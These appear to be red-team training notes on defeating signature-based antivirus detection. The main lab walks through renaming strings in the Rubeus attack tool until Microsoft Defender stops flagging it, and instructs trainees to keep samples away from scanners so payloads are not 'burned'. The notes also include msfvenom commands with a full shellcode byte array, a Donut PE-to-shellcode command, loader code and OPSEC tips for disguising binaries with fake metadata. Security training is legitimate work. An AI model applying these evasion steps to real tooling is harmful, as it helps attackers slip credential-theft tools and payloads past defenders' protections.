<blockquote>
<p>ADVANTAGES of .net binaries -&gt; can be loaded and executed completely in-memory (fileless)</p>
</blockquote>
<p>Powershell loader</p>
<p><a href="https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c">https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c</a></p>
<p>dot-net execute</p>
<h1><a class="header" href="#lab---ps-loader" id="lab---ps-loader">Lab - PS Loader</a></h1>
<h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
<blockquote>
<p><strong>TL;DR</strong> In this chapter we'll have a look at basic signature based AV evasion techniques. We'll use <code>strings.exe</code> and <code>yara</code> to explain the basic principles of pattern matching and modify existing malicious tools to bypass signature based detections.</p>
</blockquote>
<h2><a class="header" href="#1-strings" id="1-strings">1. Strings</a></h2>
<hr />
<h3><a class="header" href="#what-are-strings" id="what-are-strings"><strong>What are Strings?</strong></a></h3>
<ul>
<li>Human-readable text sequences in binary files (e.g., executables, memory dumps).</li>
<li>May include URLs, IPs, commands, or error messages.</li>
</ul>
<h3><a class="header" href="#forensic-uses" id="forensic-uses"><strong>Forensic Uses</strong></a></h3>
<ol>
<li><strong>Malware Analysis</strong>: Identify behavior, networks, or obfuscated text.</li>
<li><strong>Evidence Extraction</strong>: Recover passwords, filenames, or memory fragments.</li>
<li><strong>Correlations</strong>: Match artifacts across files/systems.</li>
<li><strong>Reverse Engineering</strong>: Understand program logic or libraries used.</li>
</ol>
<h3><a class="header" href="#tools" id="tools"><strong>Tools</strong></a></h3>
<ul>
<li><strong>Basic</strong>: <code>strings.exe</code> command (extract text from binaries). -&gt; Part of SysinternalsSuite</li>
<li><strong>Advanced</strong>: Volatility, IDA Pro, Ghidra for deeper analysis.</li>
</ul>
<h3><a class="header" href="#challenges" id="challenges"><strong>Challenges</strong></a></h3>
<ul>
<li><strong>False Positives</strong>: Some strings are irrelevant.</li>
<li><strong>Obfuscation</strong>: Text may be encrypted or encoded by attackers.</li>
</ul>
<hr />
<h3><a class="header" href="#mini-lab-on-strings" id="mini-lab-on-strings">MINI-LAB on Strings</a></h3>
<p>Run strings on NativeDump
HxD or XXD on NativeDump.exe</p>
<hr />
<h2><a class="header" href="#2-yara-a-tool-for-forensics-and-malware-detection" id="2-yara-a-tool-for-forensics-and-malware-detection">2. YARA: A Tool for Forensics and Malware Detection</a></h2>
<p><strong>YARA</strong> (Yet Another Recursive Acronym) is a powerful tool used in cybersecurity to detect and classify malware by creating rules to identify patterns in files, memory, or network traffic.</p>
<h3><a class="header" href="#key-features" id="key-features"><strong>Key Features</strong></a></h3>
<ul>
<li><strong>Pattern Matching</strong>: Scans for specific strings, hex sequences, or behaviors in files.</li>
<li><strong>Rules-Based</strong>: Allows defining conditions to identify malware traits.</li>
<li><strong>Versatility</strong>: Works on files, running processes, or memory dumps.</li>
</ul>
<h3><a class="header" href="#applications" id="applications"><strong>Applications</strong></a></h3>
<ul>
<li><strong>Malware Detection</strong>: Identify known malware by their unique signatures.</li>
<li><strong>Incident Response</strong>: Scan systems for malicious artifacts during investigations.</li>
<li><strong>Threat Hunting</strong>: Monitor for emerging threats across files and traffic.</li>
<li><strong>Reverse Engineering</strong>: Assist in analyzing malware samples and libraries.</li>
</ul>
<h3><a class="header" href="#why-yara-matters" id="why-yara-matters"><strong>Why YARA Matters</strong></a></h3>
<ul>
<li>Highly customizable for different security needs.</li>
<li>Essential for proactive threat detection and forensic investigations.</li>
</ul>
<hr />
<h3><a class="header" href="#mini-lab-on-yara" id="mini-lab-on-yara">MINI-LAB on YARA</a></h3>
<p>Let's first install YARA support in VSCODE</p>
<p><img src="./images/yaracode.jpg" alt="Screenshot" /></p>
<pre><code class="language-yara">rule PE_Detected
{
    meta:
        description = &quot;Detects 'MZ header'&quot;
        author = &quot;Peter Girnus&quot;
            web = &quot;https://www.petergirnus.com/blog&quot;

    condition:
        uint16(0) == 0x5a4d
}
</code></pre>
<p><mark>Marked text</mark></p>
<p>LitterBox</p>
<p>threatcheck/GoCheck on rubeus (make sure defender execption is off for the folder both files are located)</p>
<p>Check output threatcheck/gocheck</p>
<p>erase with 0x00's</p>
<p>use visual studio find all/replace all (match word)</p>
<blockquote>
<p>Visual Studio <code>2019</code> Components:</p>
</blockquote>
<p><img src="./images/vs_sharpkatz.jpg" alt="Screenshot" /></p>
<blockquote>
<p>SysinternalsSuite (<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a>)</p>
<p>GoCheck (<a href="https://github.com/gatariee/gocheck/releases/tag/v1.5.0">https://github.com/gatariee/gocheck/releases/tag/v1.5.0</a>)
Move GoCheck to C:\Sysinternals
Add c:\SysinternalsSuite to PATH</p>
<p>Install Python3x ?
Install Yara ? (<a href="https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-v4.5.2-2326-win64.zip">https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-v4.5.2-2326-win64.zip</a>)
Install Yara and Hex editor plugin <em>VS CODE</em>?</p>
</blockquote>
<pre><code class="language-code">For Yara Download and Install Visual C++ Redistributable:
Go to the official Microsoft download page for the Visual C++ Redistributable
(,https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist?view=msvc-170&gt;)
Download and install the Visual C++ Redistributable for Visual Studio 2015, 2017, 2019, and 2022:
Visual C++ Redistributable x64
</code></pre>
<p>How to make a new project:</p>
<pre><code class="language-csharp">dotnet new console -n MyApp
cd MyApp
dotnet build
dotnet run
</code></pre>
<h1><a class="header" href="#lab-static-analysis" id="lab-static-analysis">Lab Static Analysis</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<p>Let's take a common attack tool &quot;Rubeus&quot;, compile it and see what Defender thinks of it.</p>
<p><a href="https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s">https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s</a></p>
<p><a href="https://github.com/GhostPack/Rubeus.git">https://github.com/GhostPack/Rubeus.git</a></p>
<p>https://github.com/gatariee/gocheck/releases</p>
<p>On your windows machine:</p>
<pre><code class="language-powershell">cd git
git clone https://github.com/GhostPack/Rubeus.git
</code></pre>
<p><img src="./images/rubeus_git.jpg" alt="Screenshot" /></p>
<p>Let's compile this with <mark>Visual Studio 2022</mark></p>
<p><img src="./images/rubeus_vs.jpg" alt="Screenshot" /></p>
<p>Browse to your Rubeus solution file (C:\git\Rubeus)</p>
<p><img src="./images/rubeus_sln.jpg" alt="Screenshot" /></p>
<p>select the Program.cs file on the right side in your <code>Solution Explorer</code></p>
<p><img src="./images/rubeus_prg.jpg" alt="Screenshot" /></p>
<p>In order to compile let's change &quot;debug&quot; to &quot;release&quot; and compile as a x64 bit application. Click on &quot;Configuration Manager&quot;, </p>
<p><img src="./images/rubeus_config.jpg" alt="Screenshot" /></p>
<p><img src="./images/rubeus_x64.jpg" alt="Screenshot" /></p>
<p>Save the project, and let's compile (build).</p>
<p><img src="./images/rubeus_build.jpg" alt="Screenshot" /></p>
<p><img src="./images/rubeus_output.jpg" alt="Screenshot" /></p>
<p>Let's see if it works by running rubeus with a simple command:</p>
<p><img src="./images/rubeus_logon.jpg" alt="Screenshot" /></p>
<p>If we copy the file to our &quot;C:\&quot; directory, we'll see that Defender immediately detects it as malicious!!!</p>
<p><img src="./images/rubeus_detected.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>HINT :</strong></em> Defender didn't detect this as malicious when we compiled it since we made some ,<mark>exclusions</mark> (&quot;C:\Git&quot;, &quot;C:\Temp&quot;, &quot;C:\Desktop&quot;, ...) in Defender to avoid scanning those directories, you can check the exclusions with the following powershell command:</p>
</blockquote>
<pre><code class="language-powershell">Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
</code></pre>
<p>So now what, how did Defender exactly detect this file as malicious, as we can see it was scanned upon being written to disk - this is static (signature based detection), we'll need to make some changes to our source code to bypass these signatures.</p>
<p>We'll use <em><strong>GoCheck</strong></em> (based of DefenderCheck and ThreatCheck) to analyze our rubeus file.</p>
<p>Open a new powershell prompt and type the following command:</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_token.jpg" alt="Screenshot" /></p>
<p>We can see exactly which strings has caused Defender to detect this as malicious, <mark>ticket</mark>. So all we have to do is go back to our Visual Studio source code and find/replace all TICKET strings by something else, i.e. &quot;<em><strong>token</strong></em>&quot;.</p>
<p><img src="./images/rubeus_replace.jpg" alt="Screenshot" /></p>
<p>Make sure you select the &quot;Look in&quot; to <em><strong>Entire Solution</strong></em>, and click &quot;Replace All&quot;.</p>
<p><img src="./images/rubeus_replace_ticket.jpg" alt="Screenshot" />
<img src="./images/rubeus_replaced_ticket.jpg" alt="Screenshot" /></p>
<p>We can see 1294 References have been renamed. Save the file and let's <code>REBUILD</code> the solution. </p>
<p><img src="./images/rubeus_rebuild_token.jpg" alt="Screenshot" /></p>
<p>And now we'll scan it with GoCheck again:</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_tokenfixed.jpg" alt="Screenshot" /></p>
<p>We can see there old detection for TICKET is gone, but we have a new one: <mark>DiffieHellmanKey</mark>, alright let's fix that one, just like we did before.</p>
<p>Open Find/Replace and change DiffieHellmanKey to &quot;<em><strong>dhkey</strong></em>&quot;. Save the project, rebuild and let's scan again with GoCheck (it should replace 12 occurrences).</p>
<p><img src="./images/rubeus_gocheck_impuser.jpg" alt="Screenshot" /></p>
<p><strong>Another hit :</strong> <mark>impersonateuser</mark>,  we'll replace this with &quot;<em><strong>impuser</strong></em>&quot;. (it should replace 7 occurrences). Save the file and let's <code>REBUILD</code> the solution, and scan again with GoCheck.</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_b64.jpg" alt="Screenshot" /></p>
<p><strong>Another one?</strong> Now defender seems to dislike <mark>base64</mark>. We need to be careful with replacing this as there are functions using base64 as part of the name (i.e. Frombase64String). Let's replace this with <em><strong>base_64</strong></em>, but selecting &quot;match word&quot; to avoid renaming functions and breaking our application. (it should replace 78 occurrences)</p>
<p><img src="./images/rubeus_b64.jpg" alt="Screenshot" /></p>
<p>Save the file and let's <code>REBUILD</code> the solution, and scan again with GoCheck.</p>
<p><img src="./images/rubeus_gocheck_clean.jpg" alt="Screenshot" /></p>
<p>Tadaa!!!! Victory!!! No more detections, we can now drop the clean rubeus file to our &quot;C:\&quot; drive and defender won't detect it. Let's try:</p>
<p><img src="./images/rubeus_defenderscan.jpg" alt="Screenshot" /></p>
<h2><a class="header" href="#img-srcimagesrubeus_defender_cleanjpg-altscreenshot-" id="img-srcimagesrubeus_defender_cleanjpg-altscreenshot-"><img src="./images/rubeus_defender_clean.jpg" alt="Screenshot" /></a></h2>
<p>https://github.com/Matthew-IE/XObfuscator.git
add to Havoc C2</p>
<p>strings, threatcheck, gocheck, floss, yara</p>
<p>C:\Temp&gt;gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
c:\Git\ThreatCheck\ThreatCheck\bin\x64\Release&gt;ThreatCheck.exe -f C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe</p>
<hr />
<h1><a class="header" href="#notes" id="notes">Notes</a></h1>
<p>install code </p>
<p>install sdk (<a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-9.0.201-windows-x64-installer">https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-9.0.201-windows-x64-installer</a>)</p>
<p>install C# Dev Kit and .NET Install Tool extensions from the VS Code marketplace.</p>
<p><img src="./images/code_csharpdev.jpg" alt="Screenshot" /></p>
<p><img src="./images/code_csharinstalltool.jpg" alt="Screenshot" /></p>
<p>How to make a new project:</p>
<pre><code class="language-csharp">dotnet new console -n MyApp
cd MyApp
dotnet build
dotnet run
</code></pre>
<blockquote>
<p>INCLUDE SCREENSHOT of CLR info of sharkpatz/rubeus
SHOW dotpeek - disadvantages of C#</p>
</blockquote>
<p><img src="./images/sharpkatz_clr.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#lab---havoc-dotnet-execute" id="lab---havoc-dotnet-execute">Lab - Havoc dotnet execute</a></h1>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<blockquote>
<p><em><strong>IMPORTANT</strong></em> : Please do not send submit samples to <r>Virus Total</r> or any other public virus-scanning services, unless specifically instructed. We don't want to burn our payloads for this training.
<strong>Make sure at all times that sample submussion in Microsoft Defender is <code>turned off</code>, and if for some reason you get prompted to submit a sample, deny the request.</strong></p>
</blockquote>
<h1><a class="header" href="#forensics" id="forensics">Forensics</a></h1>
<p>strings
dnspy</p>
<h1><a class="header" href="#chapter-15---win32api-functions-kernel-and-user-mode" id="chapter-15---win32api-functions-kernel-and-user-mode">Chapter 1.5 - &quot;WIN32api, Functions, kernel and user mode&quot;</a></h1>
<p>Let's start with the basics, user-mode and kernel-mode:</p>
<p><img src="./images/userandkernelmode.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#user-mode-vs-kernel-mode-in-windows" id="user-mode-vs-kernel-mode-in-windows">User Mode vs Kernel Mode in Windows</a></h1>
<h2><a class="header" href="#1-kernel-mode" id="1-kernel-mode"><strong>1. Kernel Mode</strong></a></h2>
<ul>
<li><strong>What it is</strong>: Kernel mode is the privileged mode of operation in which code has unrestricted access to all system resources, including hardware and memory. It operates at the core of the operating system.</li>
<li><strong>Who uses it</strong>: The Windows kernel, device drivers, and other low-level system processes operate in kernel mode.</li>
<li><strong>Capabilities</strong>:
<ul>
<li>Direct access to the hardware (e.g., CPU, memory, storage devices).</li>
<li>Ability to execute critical system-level instructions.</li>
</ul>
</li>
<li><strong>Risks</strong>: Errors in kernel-mode processes can lead to system crashes or instability (commonly referred to as a &quot;blue screen&quot;).</li>
</ul>
<h2><a class="header" href="#2-user-mode" id="2-user-mode"><strong>2. User Mode</strong></a></h2>
<ul>
<li><strong>What it is</strong>: User mode is the restricted mode in which applications and processes run. Code executed in user mode cannot directly access hardware or system resources and relies on the kernel for such operations.</li>
<li><strong>Who uses it</strong>: Regular applications (e.g., browsers, text editors) and user-level processes operate in user mode.</li>
<li><strong>Capabilities</strong>:
<ul>
<li>Processes in user mode interact with hardware indirectly through system calls provided by the kernel.</li>
<li>Memory and resources are isolated, minimizing the impact of an application crash.</li>
</ul>
</li>
<li><strong>Benefits</strong>: User mode enhances system stability by isolating applications from the core system operations. If a user-mode application crashes, it typically does not affect the operating system itself.</li>
</ul>
<h2><a class="header" href="#switching-between-modes" id="switching-between-modes"><strong>Switching Between Modes</strong></a></h2>
<ul>
<li>In Windows, switching between user mode and kernel mode happens when a user-mode application requests system resources (e.g., file I/O or network access). These requests are performed using <strong>system calls</strong>. The operating system processes these calls in kernel mode and returns the results to the user-mode application.</li>
</ul>
<hr />
<h3><a class="header" href="#summary-5" id="summary-5"><strong>Summary</strong></a></h3>
<ul>
<li><strong>Kernel mode</strong> = Power and responsibility.</li>
<li><strong>User mode</strong> = Safety and isolation.</li>
</ul>
<p>This separation is crucial for maintaining security and stability in modern operating systems.</p>
<hr />
<p>learn.micorosoft.com</p>
<p>Explain Kernel vs user mode (ntdll.dll, kernel32.dll, kernelbase.dll)</p>
<p>Explain DLL's</p>
<p><img src="./images/function_flow.jpg" alt="Screenshot" /></p>
<p>WIN32 api functions (slides)</p>
<p><img src="./images/function_userkernel.jpg" alt="Screenshot" /></p>
<p>https://malapi.io/</p>
<p>Api monitor
x64dbg</p>
<p><img src="./images/functions_flow.jpg" alt="Screenshot" />
<a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls">https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls</a></p>
<p><img src="./images/functions_virtualalloc.jpg" alt="Screenshot" /></p>
<p><img src="./images/functions_createthread.jpg" alt="Screenshot" /></p>
<p><img src="./images/functions_waitforsingleobject.jpg" alt="Screenshot" /></p>
<p>Let's build a dummy shellcode:</p>
<p>hello world dialog</p>
<p><a href="https://github.com/hasherezade/pe_to_shellcode/releases/tag/v1.2">https://github.com/hasherezade/pe_to_shellcode/releases/tag/v1.2</a></p>
<pre><code class="language-bash">sudo msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT=&quot;Successful Execution :)&quot; TITLE=&quot;CrimsonCORE&quot;  -f exe -o msg.exe
</code></pre>
<p>https://www.youtube.com/watch?v=0PUZbgcIMzg
create a dialogbox with metadata</p>
<blockquote>
<p><em><strong>IMPORTANT:</strong></em> The closer you can work to the kernel (ntdll.dll), the least chance on detection, since kernel32 and kernelbase all eventually translate into an ntdll.dll function. NTDLL.dll is basically a wrapper for syscalls to kernel mode.</p>
</blockquote>
<pre><code class="language-csharp">using System;
using System.Diagnostics;
using System.Linq;

class Program
{
    static void Main()
    {

        // Buffer with our shellcode
        byte[] shellCode;
        shellCode = new byte[] 
        { 
            0xfc,0xfc 
        };
        Console.Clear();
        Console.Write(&quot;Shellcode: &quot;);

        foreach (byte b in shellCode)
        {
            Console.Write($&quot;0x{b:X2}, &quot;);  // X2 formats as two-character uppercase hex
        }

        Console.WriteLine();  // To add a newline at the end
        Console.WriteLine();  // To add a newline at the end

        // Find the process with the name &quot;explorer&quot;
        var explorerProcess = Process.GetProcessesByName(&quot;explorer&quot;).FirstOrDefault();

        if (explorerProcess != null)
        {
            Console.WriteLine($&quot;Process ID of explorer.exe: {explorerProcess.Id}&quot;);
        }
        else
        {
            Console.WriteLine(&quot;explorer.exe not found.&quot;);
        }
        Console.WriteLine();  // To add a newline at the end

        // Wait for any key to be pressed
        Console.WriteLine(&quot;Press any key to stop...&quot;);
        Console.ReadKey();

    }
}
</code></pre>
<h1><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h1>
<p><img src="./images/PEFormat.jpg" alt="Screenshot" /></p>
<p>The shellcode is initially stored as a byte[] array in the .rdata section of the PE file on disk (as read-only data).
At runtime, the shellcode is copied to a dynamically allocated memory region (created by VirtualAlloc) that is not part of the PE file’s section structure.</p>
<p>The shellcode is executed from this dynamically allocated memory, not from a PE section like .text or a custom section.
This approach avoids modifying the PE file on disk, making it harder to detect through static analysis. However, it relies on runtime memory allocation, which may be flagged by modern security mechanisms.</p>
<p>.rdata = readonly data</p>
<h2><a class="header" href="#--what-is-position-independent-code-shellcode" id="--what-is-position-independent-code-shellcode">[-] What is Position Independent Code (Shellcode)?</a></h2>
<p>Position Independent Code is code that is designed to execute regardless of where it resides in memory. This is in contrast to most programs, which might need to be loaded at a specific address to function correctly. Shellcode is a type of PIC, often written for exploits and payloads in hacking.</p>
<p>The term “Shellcode” originally referred to code that, when executed, would spawn a command shell — hence the name. However, today, it generally refers to any payload used for exploitation.</p>
<h3><a class="header" href="#--uses-of-shellcode" id="--uses-of-shellcode">[-] Uses of Shellcode:</a></h3>
<p><em><strong>Exploitation</strong></em>: The primary use of shellcode is to exploit vulnerabilities in software, where the attacker can inject and execute their code.
<em><strong>Payloads</strong></em>: Once a vulnerability is exploited, shellcode can be used to deliver payloads, which can range from spawning a reverse shell to injecting ransomware or establishing persistence.
<em><strong>Bypassing Restrictions</strong></em>: Shellcode can be crafted to bypass security mechanisms, making detection and mitigation difficult.</p>
<h3><a class="header" href="#--shellcode-vs-compiled-code-vs-interpreted-code" id="--shellcode-vs-compiled-code-vs-interpreted-code">[-] Shellcode vs. Compiled Code vs. Interpreted Code:</a></h3>
<p><em><strong>Shellcode</strong></em>: As mentioned, shellcode is position-independent, designed to run from any location in memory. It doesn’t rely on external libraries or functions and should be small and efficient to work within the constraints of an exploit.</p>
<p><em><strong>Compiled Code</strong></em>: This is code written in languages like C or C++ that is then compiled into machine code by a compiler. The result is a binary executable that the system can run. Unlike shellcode, compiled programs often rely on fixed memory addresses and external libraries.</p>
<p><em><strong>Interpreted Code</strong></em>: This is code written in languages like Python, Ruby, or JavaScript that is executed line-by-line by an interpreter. It’s not converted into machine code; instead, the interpreter reads and executes it directly. This makes it generally slower than compiled code, but it’s more flexible and platform-independent.</p>
<p>PE-File vs Shellcode</p>
<pre><code class="language-bash">msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c                                            
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of c file: 1188 bytes
unsigned char buf[] = 
&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;
</code></pre>
<h1><a class="header" href="#using-donut-to-convert-a-pe-to-shellcode" id="using-donut-to-convert-a-pe-to-shellcode">USing DONUT to convert a PE to Shellcode</a></h1>
<pre><code class="language-powershell">donut.exe -e 1 -a x64 -o shellcode.donut -f 3 -i calcloader.exe -z 1 -b 1 -k 2
</code></pre>
<p>In a Portable Executable (PE) file, the <code>unsigned char shellcode[]</code> array is typically stored in the <code>.data</code> section. This section is used for storing initialized global and static variables. The <code>.data</code> section is marked as readable and writable.</p>
<p>Here's a brief overview of the relevant sections in a PE file:</p>
<ul>
<li><strong>.text</strong>: Contains the executable code.</li>
<li><strong>.data</strong>: Contains initialized global and static variables.</li>
<li><strong>.bss</strong>: Contains uninitialized global and static variables.</li>
<li><strong>.rdata</strong>: Contains read-only data, such as string literals and constants.</li>
</ul>
<p>Since <code>shellcode</code> is an initialized global variable, it will be placed in the <code>.data</code> section of the PE file.</p>
<p>To summarize, the <code>unsigned char shellcode[]</code> array in your code will be stored in the <code>.data</code> section of the PE file.</p>
<p>Let's open CFF Explorer and dump the <code>data section</code>.</p>
<p><img src="./images/cff_datasection.jpg" alt="image" /></p>
<p>And open that file in Hexdump:</p>
<p><img src="./images/hexdump_shell.jpg" alt="image" /></p>
<p>Let's have a look, lets open powershell and run our loader.</p>
<p><img src="./images/powershell_memloc.jpg" alt="image" /></p>
<p>Then attach <code>x64dbg</code> to the localloader.exe and check for those two memory locations:</p>
<p><img src="./images/xdbg_mem.jpg" alt="image" /></p>
<p><img src="./images/xdbg_string.jpg" alt="image" /></p>
<p><img src="./images/procmon_dlls.jpg" alt="image" /></p>
<p><img src="./images/procmon_rwx.jpg" alt="image" /></p>
<h2><a class="header" href="#img-srcimagesprocmon_shellcodejpg-altimage-" id="img-srcimagesprocmon_shellcodejpg-altimage-"><img src="./images/procmon_shellcode.jpg" alt="image" /></a></h2>
<pre><code>**What is AMSI/Dotnet (managed/unmanaged code)**
    The .NET Framework provides the Assembly.Load method which allows loading Common Object 
    File Format (COFF) images like such as DLL’s and EXE’s. Assembly.Load can be supplied 
    with a file path to load a DLL from disk, or with a byte array to load directly in memory.

Threatcheck/AMSI Trigger

ClamAV
    dotpeek/hexdump --canonical
    strings -n 5
</code></pre>
<p>Shelcode formats (shellcode formatter etc)</p>
<blockquote>
<p>OPSEC HINT: Make sure your binaries look legit, add metadata and and icon to the file!</p>
</blockquote>
<p>On Windows (requires SDK):
<a href="https://dotnet.microsoft.com/en-us/">https://dotnet.microsoft.com/en-us/</a></p>
<h2><a class="header" href="#cscexe-csharpdotnet" id="cscexe-csharpdotnet"><em><strong>csc.exe (CSharp/dotnet)</strong></em></a></h2>
<pre><code class="language-code">c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:loader.exe loader.cs
csc.exe /t:exe /out:$utilName /unsafe $katzPath
</code></pre>
<pre><code class="language-csharp">// AssemblyInfo.cs
[assembly: AssemblyTitle(&quot;YourProductName&quot;)]
[assembly: AssemblyDescription(&quot;Some description&quot;)]
[assembly: AssemblyConfiguration(&quot;&quot;)]
[assembly: AssemblyCompany(&quot;YourCompanyName&quot;)]
[assembly: AssemblyProduct(&quot;YourProductName&quot;)]
[assembly: AssemblyCopyright(&quot;© YourCompanyName&quot;)]
[assembly: AssemblyTrademark(&quot;&quot;)]
[assembly: AssemblyCulture(&quot;&quot;)]
[assembly: AssemblyVersion(&quot;1.0.0.0&quot;)]
[assembly: AssemblyFileVersion(&quot;1.0.0.0&quot;)]
</code></pre>
<pre><code class="language-powershell">csc -out:evil.exe -optimize- -win32icon:app.ico Program.cs AssemblyInfo.cs
</code></pre>
<p>You can extract metadata from any binary with this simple program.</p>
<pre><code class="language-powershell">dotnet new console -n AssemblyInfoExtractor
cd AssemblyInfoExtractor
</code></pre>
<p>Create a &quot;Program.cs&quot; file here</p>
<pre><code class="language-csharp">using System;
using System.Reflection;

namespace AssemblyInfoExtractor
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine(&quot;Please provide the path to the assembly.&quot;);
                return;
            }

            string assemblyPath = args[0];
            try
            {
                var assembly = Assembly.LoadFile(assemblyPath);
                var assemblyName = assembly.GetName();

                Console.WriteLine($&quot;Assembly Full Name: {assemblyName.FullName}&quot;);
                Console.WriteLine($&quot;Version: {assemblyName.Version}&quot;);

                var attributes = assembly.GetCustomAttributesData();
                foreach (var attr in attributes)
                {
                    if (attr.AttributeType == typeof(AssemblyCompanyAttribute))
                    {
                        Console.WriteLine($&quot;Company: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyProductAttribute))
                    {
                        Console.WriteLine($&quot;Product: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyCopyrightAttribute))
                    {
                        Console.WriteLine($&quot;Copyright: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyTitleAttribute))
                    {
                        Console.WriteLine($&quot;Title: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyDescriptionAttribute))
                    {
                        Console.WriteLine($&quot;Description: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($&quot;Error: {ex.Message}&quot;);
            }
        }
    }
}
</code></pre>
<pre><code class="language-powershell">dotnet build
dotnet run --project C:\Temp\AssemblyInfoExtractor\AssemblyInfoExtractor.csproj C:\Temp\LocalLoader.exe
</code></pre>
<p>or run the exe:</p>
<pre><code class="language-powershell">C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;dir
 Volume in drive C is Windows
 Volume Serial Number is 368D-BFAA

 Directory of C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0

02/21/2025  04:35 PM    &lt;DIR&gt;          .
02/21/2025  04:35 PM    &lt;DIR&gt;          ..
02/21/2025  04:31 PM               455 AssemblyInfoExtractor.deps.json
02/21/2025  04:35 PM             6,656 AssemblyInfoExtractor.dll
02/21/2025  04:35 PM           145,408 AssemblyInfoExtractor.exe
02/21/2025  04:35 PM            11,080 AssemblyInfoExtractor.pdb
02/21/2025  04:31 PM               268 AssemblyInfoExtractor.runtimeconfig.json
               5 File(s)        163,867 bytes
               2 Dir(s)   2,280,939,520 bytes free

C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;AssemblyInfoExtractor.exe C:\Temp\LocalLoader.exe
Assembly Full Name: LocalLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
